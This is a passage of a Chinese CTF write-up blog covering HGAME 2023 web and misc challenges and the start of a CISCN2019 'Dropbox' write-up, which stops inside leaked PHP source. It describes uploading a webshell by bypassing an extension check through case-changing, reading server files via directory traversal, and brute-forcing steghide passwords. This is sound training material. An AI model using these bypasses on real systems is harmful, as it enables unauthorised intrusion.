模块编写脚本，</p><p>由于这一题需要我们答对100次，且http协议是无状态的，每次请求间没有关系，所以我们需要使用同一个会话，保证cookie能够相互联系，我们需要使用 <code>requests.Session()</code> ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> requests<br>session = requests.Session()<br>member_data = json.load(<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;member.json&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>))<br>question_u = <span class="hljs-string">&quot;http://week-1.hgame.lwsec.cn:30257/api/getQuestion&quot;</span><br>verify_u = <span class="hljs-string">&quot;http://week-1.hgame.lwsec.cn:30257/api/verifyAnswer&quot;</span><br>score_u = <span class="hljs-string">&quot;http://week-1.hgame.lwsec.cn:30257/api/getScore&quot;</span><br>headers = &#123;<br>    <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36&quot;</span><br>&#125;<br>count = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    quesion = json.loads(session.get(question_u).text)[<span class="hljs-string">&#x27;message&#x27;</span>]<br>    <span class="hljs-keyword">for</span> data <span class="hljs-keyword">in</span> member_data:<br>        intro = data[<span class="hljs-string">&#x27;intro&#x27;</span>]<br>        <span class="hljs-built_in">id</span> = data[<span class="hljs-string">&#x27;id&#x27;</span>]<br>        <span class="hljs-keyword">if</span> intro <span class="hljs-keyword">in</span> quesion:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;----------------------------第&quot;</span>+<span class="hljs-built_in">str</span>(count)+<span class="hljs-string">&quot;次答对&quot;</span>)<br>            <span class="hljs-built_in">print</span>(intro)<br>            data = &#123;<br>                <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-built_in">id</span><br>            &#125;<br>            verify = json.loads(session.post(url=verify_u,data=data,headers=headers).text)[<span class="hljs-string">&#x27;message&#x27;</span>]<br>            <span class="hljs-built_in">print</span>(verify)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Correct&quot;</span> <span class="hljs-keyword">in</span> verify:<br>                <span class="hljs-keyword">try</span>:<br>                    count = <span class="hljs-built_in">int</span>(json.loads(session.get(url=score_u, headers=headers).text)[<span class="hljs-string">&#x27;message&#x27;</span>])<br>                <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                    <span class="hljs-built_in">print</span>(e)<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;脚本运行结束！&quot;</span>)<br>                    exit(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>简单的说，脚本就是通过遍历member列表，获取其中的intro值，判断是否与question一致，如果相同，向 <code>verifyAnswer</code> 接口发送 id进行验证，如果验证成功，获取答题次数，当超过100次就停止答题，通过异常的形式输出flag</p><h3 id="Show-Me-Your-Beauty"><a href="#Show-Me-Your-Beauty" class="headerlink" title="Show Me Your Beauty"></a>Show Me Your Beauty</h3><blockquote><p>登陆了之前获取的会员账号之后，兔兔想找一张自己的可爱照片，上传到个人信息的头像中 :D 不过好像可以上传些奇怪后缀名的文件诶 XD</p></blockquote><p>很简单的文件上传题，我们直接上传图片马:</p><p><img src="https://s2.loli.net/2023/01/11/hKnitgklzUy9EsW.png"></p><p>上传成功，但是我们上传图片没有用，需要上传php脚本，我们将后缀改为<code>php</code>：</p><p><img src="https://s2.loli.net/2023/01/11/hKnitgklzUy9EsW.png" alt="image-20230111225205449"></p><p>发现后缀非法，于是我们尝试大小写绕过：</p><p><img src="https://s2.loli.net/2023/01/11/qY9c517ors3VHDA.png" alt="image-20230111225539369"></p><p>上传成功了，我们访问： <code>/img/shell.phP</code> </p><img src="https://s2.loli.net/2023/01/11/xkWVzY7UCoXPwIf.png" alt="image-20230111225430474" style="zoom:33%;" /><p>直接命令执行，获得flag</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Sign-In"><a href="#Sign-In" class="headerlink" title="Sign In"></a>Sign In</h3><blockquote><p>欢迎参加HGAME2023,Base64解码这段Flag，然后和兔兔一起开始你的HGAME之旅吧，祝你玩的愉快！ aGdhbWV7V2VsY29tZV9Ub19IR0FNRTIwMjMhfQ&#x3D;&#x3D;</p></blockquote><p>base64解密</p><h3 id="Where-am-I"><a href="#Where-am-I" class="headerlink" title="Where am I"></a>Where am I</h3><blockquote><p>兔兔回家之前去了一个神秘的地方，并拍了张照上传到网盘，你知道他去了哪里吗？ flag格式为: hgame{经度时_经度分_经度秒_东经(E)&#x2F;西经(W)_纬度时_纬度分_纬度秒_南纬(S)&#x2F;北纬(N)}，秒精确到小数点后两位 例如: 11°22’33.99’’E, 44°55’11.00’’S 表示为 hgame{11_22_3399_E_44_55_1100_S}</p></blockquote><p>下载附件后，得到一个 <code>pcapng</code> 文件 ，我们使用<code>wireshark</code>打开 ，查看http协议：</p><p><img src="https://s2.loli.net/2023/01/11/8ISUD2yG9haBbrf.png" alt="image-20230111230023980"></p><p>追踪该文件的http流：</p><p><img src="https://s2.loli.net/2023/01/11/cayrKAI9szq7C3u.png" alt="image-20230111230403933"></p><p>发现了 rar压缩包的内容，我们可以使用 <code>wireshark</code> 进行分离，</p><p>我们先了解一下 rar文件的格式：</p><p><img src="https://s2.loli.net/2023/01/12/HqPT1XBQmLRoy9V.jpg" alt="标记块"></p><p>rar文件固定开头：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">52 </span><span class="hljs-number">61</span> <span class="hljs-number">72</span> <span class="hljs-number">21</span> <span class="hljs-number">1</span>A <span class="hljs-number">07</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><p>rar文件固定结尾：</p><p><img src="https://s2.loli.net/2023/01/12/DuviZOlgV9ceSHW.jpg" alt="结尾块"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">C4</span> <span class="hljs-number">3</span>D <span class="hljs-number">7</span>B <span class="hljs-number">00</span> <span class="hljs-number">40</span> <span class="hljs-number">07</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><p>综上，我们可以使用，16进制文件格式进行分离，我们先将 wireshark设置为原始数据格式：</p><img src="https://s2.loli.net/2023/01/12/UeyWfcDhpXlMOt7.png" alt="image-20230112115350247" style="zoom:33%;" /><p>然后进行查找文件头，文件尾，将其中的16进制数据复制：</p><p><img src="https://s2.loli.net/2023/01/12/D6fmcknbiBKuEHA.png" alt="image-20230112115602472"></p><p>然后将数据使用 <code>010Editor</code> 保存 ，复制的时候不能直接 <code>ctrl+v</code>复制 ，需要 <code>ctrl+shift+v</code>，这样才能复制为16进制形式，然后我们保存为<code>rar</code>文件：</p><img src="https://s2.loli.net/2023/01/12/lk1mznpJsD5fuxr.png" alt="image-20230112115736525" style="zoom:50%;" /><p>我们打开rar文件，发现文件头损坏：</p><p><img src="https://s2.loli.net/2023/01/12/BxkZb3hHJryDpNz.png" alt="image-20230112115809631"></p><p>然后我们查询<code>rar文件格式</code> 相关资料，发现：</p><p><img src="https://s2.loli.net/2023/01/12/hwO5TDrEMZXYiA4.jpg" alt="文件头1"></p><p>我们发现我们的位标记为 <code>24 90</code> ,与图中 <code>20 90</code> 不一样，我们修改一下：</p><img src="https://s2.loli.net/2023/01/12/HfuXdkyEIgxoU5W.png" alt="image-20230112120352894" style="zoom: 50%;" /><p>此时 rar压缩包已经可以打开了，我们在图片的属性中可以获得flag：</p><img src="https://s2.loli.net/2023/01/12/Ze3yxVabGASdI64.png" alt="image-20230112120455484" style="zoom:33%;" /><p>这一题主要是对 rar文件格式的考察，需要进一步熟悉 rar文件格式</p><h3 id="神秘的海报"><a href="#神秘的海报" class="headerlink" title="神秘的海报"></a>神秘的海报</h3><blockquote><p>坐车回到家的兔兔听说ek1ng在HGAME的海报中隐藏了一个秘密……（还记得我们的Misc培训吗？</p></blockquote><p>下载附件后得到一个图片，经过一番尝试，发现是 <code>LSB隐写</code></p><p>我们使用 <code>stegsolve</code>  打开图片，选择 <code>Data Extract</code> 模式：</p><img src="https://s2.loli.net/2023/01/11/SACQ3rVcaYBZKxl.png" alt="image-20230111230714474" style="zoom:33%;" /><p>然后选择0通道：</p><img src="https://s2.loli.net/2023/01/11/a1VG7k8453cYXIQ.png" alt="image-20230111231016509" style="zoom:33%;" /><p>发现里面有很多文字，包含了前半段flag，并且提示说后半段flag在该网址中，我们需要使用<code>steghide</code></p><img src="https://s2.loli.net/2023/01/11/ZdFCSPqxp2wBJEW.png" alt="image-20230111231223177" style="zoom:33%;" /><p>科学上网下载该文件，是一个后缀为 <code>wav</code> 的音乐文件，我们使用steghide解密：</p><img src="https://s2.loli.net/2023/01/11/jAZGpLqgdtXDIch.png" alt="image-20230111231555486" style="zoom:33%;" /><p>直接猜中了解密密码：<code>123456</code>，打开txt文件就是flag。</p><p>但是我们也可以写一个 <code>shell</code> 脚本：</p><p>我们先新建一个 <code>shell.sh</code> 文件，然后使用 <code>vim</code> 编辑</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">! /bin/sh</span><br>for((i=123400;i&lt;123500;i++)) <br>do<br>a=&#x27;steghide extract -sf Bossanova.wav -p &#x27; <br>b=$i<br><span class="hljs-meta prompt_">$</span><span class="language-bash">a<span class="hljs-variable">$b</span></span><br>echo $i<br>done<br></code></pre></td></tr></table></figure><p>执行 <code>shell.sh</code> ：<code>bash shell.sh</code></p><img src="https://s2.loli.net/2023/01/11/dDhH8Zn3ok9sPA2.png" alt="image-20230111232958751" style="zoom:33%;" /><p>分离得到flag</p><h3 id="e99p1ant-want-girlfriend"><a href="#e99p1ant-want-girlfriend" class="headerlink" title="e99p1ant_want_girlfriend"></a>e99p1ant_want_girlfriend</h3><blockquote><p>兔兔在抢票网站上看到了一则相亲广告，人还有点小帅，但这个图片似乎有点问题，好像是CRC校验不太正确？</p></blockquote><p>crc校验失败，此处修改图片高度即可。或者可以使用脚本计算出高度</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>week1</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>web(第3页wp)</title>
    <link href="/2023/08/24/web(%E7%AC%AC3%E9%A1%B5wp)/"/>
    <url>/2023/08/24/web(%E7%AC%AC3%E9%A1%B5wp)/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><p>[TOC]</p><h2 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h2><p>首页有一个文件上传页面，可以上传文件，经过测试说只能上传gif、png、jpg图片，但是我们修改一下MIME属性就成功绕过了：</p><p><img src="https://s2.loli.net/2023/05/11/WRZMD24wN3eqhLv.png" alt="image-20230511193322115"></p><p>但是会将文件进行重命名，变为gif、jpg、png后缀，导致我们正常文件上传思路中断了，但是这有一个下载按钮，测试后发现任意文件下载漏洞：</p><p><img src="https://s2.loli.net/2023/05/11/d25KtQFe1L8P7ZW.png" alt="image-20230511193630149"></p><p>目录穿越漏洞，成功获得index.php源码。同样的，我们获得了download.php、class.php、delete.php源码：</p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br><br>&lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;<br>&lt;meta name=<span class="hljs-string">&quot;viewport&quot;</span> content=<span class="hljs-string">&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;</span>&gt;<br>&lt;title&gt;网盘管理&lt;/title&gt;<br><br>&lt;head&gt;<br>    &lt;link href=<span class="hljs-string">&quot;static/css/bootstrap.min.css&quot;</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span>&gt;<br>    &lt;link href=<span class="hljs-string">&quot;static/css/panel.css&quot;</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span>&gt;<br>    &lt;script src=<span class="hljs-string">&quot;static/js/jquery.min.js&quot;</span>&gt;&lt;/script&gt;<br>    &lt;script src=<span class="hljs-string">&quot;static/js/bootstrap.bundle.min.js&quot;</span>&gt;&lt;/script&gt;<br>    &lt;script src=<span class="hljs-string">&quot;static/js/toast.js&quot;</span>&gt;&lt;/script&gt;<br>    &lt;script src=<span class="hljs-string">&quot;static/js/panel.js&quot;</span>&gt;&lt;/script&gt;<br>&lt;/head&gt;<br><br>&lt;body&gt;<br>    &lt;nav aria-label=<span class="hljs-string">&quot;breadcrumb&quot;</span>&gt;<br>    &lt;ol <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">breadcrumb</span>&quot;&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">li</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">breadcrumb</span>-<span class="hljs-title">item</span> <span class="hljs-title">active</span>&quot;&gt;管理面板&lt;/<span class="hljs-title">li</span>&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">li</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">breadcrumb</span>-<span class="hljs-title">item</span> <span class="hljs-title">active</span>&quot;&gt;&lt;<span class="hljs-title">label</span> <span class="hljs-title">for</span>=&quot;<span class="hljs-title">fileInput</span>&quot; <span class="hljs-title">class</span>=&quot;<span class="hljs-title">fileLabel</span>&quot;&gt;上传文件&lt;/<span class="hljs-title">label</span>&gt;&lt;/<span class="hljs-title">li</span>&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">li</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">active</span> <span class="hljs-title">ml</span>-<span class="hljs-title">auto</span>&quot;&gt;&lt;<span class="hljs-title">a</span> <span class="hljs-title">href</span>=&quot;#&quot;&gt;你好 &lt;?<span class="hljs-title">php</span> <span class="hljs-title">echo</span> $<span class="hljs-title">_SESSION</span>[&#x27;<span class="hljs-title">username</span>&#x27;]?&gt;&lt;/<span class="hljs-title">a</span>&gt;&lt;/<span class="hljs-title">li</span>&gt;</span><br><span class="hljs-class">    &lt;/<span class="hljs-title">ol</span>&gt;</span><br><span class="hljs-class">&lt;/<span class="hljs-title">nav</span>&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">input</span> <span class="hljs-title">type</span>=&quot;<span class="hljs-title">file</span>&quot; <span class="hljs-title">id</span>=&quot;<span class="hljs-title">fileInput</span>&quot; <span class="hljs-title">class</span>=&quot;<span class="hljs-title">hidden</span>&quot;&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">top</span>&quot; <span class="hljs-title">id</span>=&quot;<span class="hljs-title">toast</span>-<span class="hljs-title">container</span>&quot;&gt;&lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class"></span><br><span class="hljs-class">&lt;?<span class="hljs-title">php</span></span><br><span class="hljs-class"><span class="hljs-title">include</span> &quot;<span class="hljs-title">class</span>.<span class="hljs-title">php</span>&quot;;</span><br><span class="hljs-class"></span><br><span class="hljs-class">$<span class="hljs-title">a</span> = <span class="hljs-title">new</span> <span class="hljs-title">FileList</span>($<span class="hljs-title">_SESSION</span>[&#x27;<span class="hljs-title">sandbox</span>&#x27;]);</span><br><span class="hljs-class">$<span class="hljs-title">a</span>-&gt;<span class="hljs-title">Name</span>();</span><br><span class="hljs-class">$<span class="hljs-title">a</span>-&gt;<span class="hljs-title">Size</span>();</span><br><span class="hljs-class">?&gt;</span><br></code></pre></td></tr></table></figure><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$dbaddr</span> = <span class="hljs-string">&quot;127.0.0.1&quot;</span>;<br><span class="hljs-variable">$dbuser</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$dbpass</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$dbname</span> = <span class="hljs-string">&quot;dropbox&quot;</span>;<br><span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-variable">$dbaddr</span>, <span class="hljs-variable">$dbuser</span>, <span class="hljs-variable">$dbpass</span>, <span class="hljs-variable">$dbname</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$db</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$db</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;db = <span class="hljs-variable">$db</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">user_exist</span>(<span class="hljs-params"><span class="hljs-variable">$username</span></span>) </span>&#123;<br>        <span class="hljs-variable">$stmt</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;</span>);<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bind_param</span>(<span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-variable">$username</span>);<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">store_result</span>();<br>        <span class="hljs-variable">$count</span> = <span class="hljs-variable">$stmt</span>-&gt;num_rows;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$count</span> === <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">add_user</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">user_exist</span>(<span class="hljs-variable">$username</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$password</span> . <span class="hljs-string">&quot;SiAchGHmFx&quot;</span>);<br>        <span class="hljs-variable">$stmt</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;</span>);<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bind_param</span>(<span class="hljs-string">&quot;ss&quot;</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>);<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">verify_user</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">user_exist</span>(<span class="hljs-variable">$username</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$password</span> . <span class="hljs-string">&quot;SiAchGHmFx&quot;</span>);<br>        <span class="hljs-variable">$stmt</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;</span>);<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bind_param</span>(<span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-variable">$username</span>);<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bind_result</span>(<span class="hljs-variable">$expect</span>);<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$expect</span>) &amp;&amp; <span class="hljs-variable">$expect</span> === <span class="hljs-variable">$password</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileList</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$files</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$results</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$funcs</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;files = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-variable language_">$this</span>-&gt;results = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-variable language_">$this</span>-&gt;funcs = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-variable">$filenames</span> = <span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-variable">$path</span>);<br><br>        <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-variable">$filenames</span>);<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$filenames</span>[<span class="hljs-variable">$key</span>]);<br>        <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-string">&quot;..&quot;</span>, <span class="hljs-variable">$filenames</span>);<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$filenames</span>[<span class="hljs-variable">$key</span>]);<br><br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$filenames</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$filename</span>) &#123;<br>            <span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>();<br>            <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$path</span> . <span class="hljs-variable">$filename</span>);<br>            <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$this</span>-&gt;files, <span class="hljs-variable">$file</span>);<br>            <span class="hljs-variable language_">$this</span>-&gt;results[<span 